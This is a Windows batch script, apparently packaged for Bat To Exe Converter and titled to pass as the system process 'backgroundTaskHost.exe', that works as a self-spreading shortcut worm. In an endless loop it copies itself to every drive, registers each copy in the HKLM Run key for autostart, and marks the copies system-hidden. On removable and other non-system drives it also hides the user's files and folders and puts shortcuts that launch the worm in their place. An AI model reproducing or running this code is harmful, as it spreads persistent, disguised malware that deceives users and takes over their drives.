::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyBJjZltiQAWGfEKsB7sT/tSruaTHjVkVUfADSJ3U0LGNNPMv0WLtYb441DpondsDHxJMcQCiaxwJlWxDtW+CJciJvQvVS1uCzkQjDytxn2bsnyM0csdrj9dN1ji7nA==
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF65
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJheFUEAlXVbTjuSOR8
::ZQ05rAF9IBncCkqN+0xwdVsFHErScjrtV+ZIprmb
::ZQ05rAF9IAHYFVzEqQIdIRhGQxeNOn8YyPUr4eb/4P2UAINde/I6ao7P07qJYNMK+VHhePY=
::eg0/rx1wNQPfEVWB+kM9LVsJDAaDP2C9FLoJ5uzP7vmMikIOQKw6YIq7
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQISKRhfSxaNKWW+RoEd++O7x+WUti0=
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATEVosdIRhGQxeNOn/6JboO+Ofp7v6OrUNTFMMzdM/J07OGNPNT+ED3cIQ70346
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJAnXugIGJBpQDC2UPWW1EIlMvqa7wP6Pp18hZPAwcorYzqeyG8ca/m3xd9Yf02pVi8IYAwlRewGWUg01qmVFpGuQOcOoshzqYkea8gU1A2BIhWLThywpb8ZmnvcCwCuW817r0aAI1Bg=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
chcp 65001>nul

title backgroundTaskHost.exe [MikronT]





set key_target=
for /f "tokens=1,* delims=- " %%i in ("%*") do set %%i
if "%key_target%" NEQ "" start "%key_target%" explorer "%key_target%"

if "%key_running%" == "1" exit
set key_running=1

rem echo.%*
rem pause>nul





:cycle
for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
  if exist "%%i:\" (
    if exist "%%i:\%~nx0" (
      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host - %%i" /d "%%i:\%~nx0" /f
      attrib +s +h "%%i:\%~nx0"

      if "%%i:" NEQ "%SystemDrive%" if "%%i" NEQ "D" (
        for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
          if "%%x" NEQ "$RECYCLE.BIN" if "%%x" NEQ "FOUND.000" if "%%x" NEQ "Recycled" if "%%x" NEQ "System Volume Information" (
            attrib +h "%%i:\%%x"
            if not exist "%%i:\%%x.lnk" (
              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0 --key_target=%%i:\%%x" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
            )
          )
        )

        for /f "delims=" %%x in ('dir "%%i:\*" /a:-d /b 2^>nul') do (
          if "%%x" NEQ "desktop.ini" if "%%x" NEQ "pagefile.sys" if "%%x" NEQ "Thumbs.db" (
            attrib +h "%%i:\%%x"
            if not exist "%%i:\%%x.lnk" (
              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0 --key_target=%%i:\%%x" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
            )
          )
        )
      )
    ) else copy /y "%~dpnx0" %%i:\
  )
)



timeout /nobreak /t 10 >nul
goto :cycle



rem powershell $shortcut = ^(New-Object -comObject Wscript.Shell^).CreateShortcut^('%%i:\%%x.lnk'^); $shortcut.TargetPath = '%%i:\%%x'; $shortcut.Save^(^)

rem tasklist | find /i "%~nx0">>nul || goto :cycle
rem exit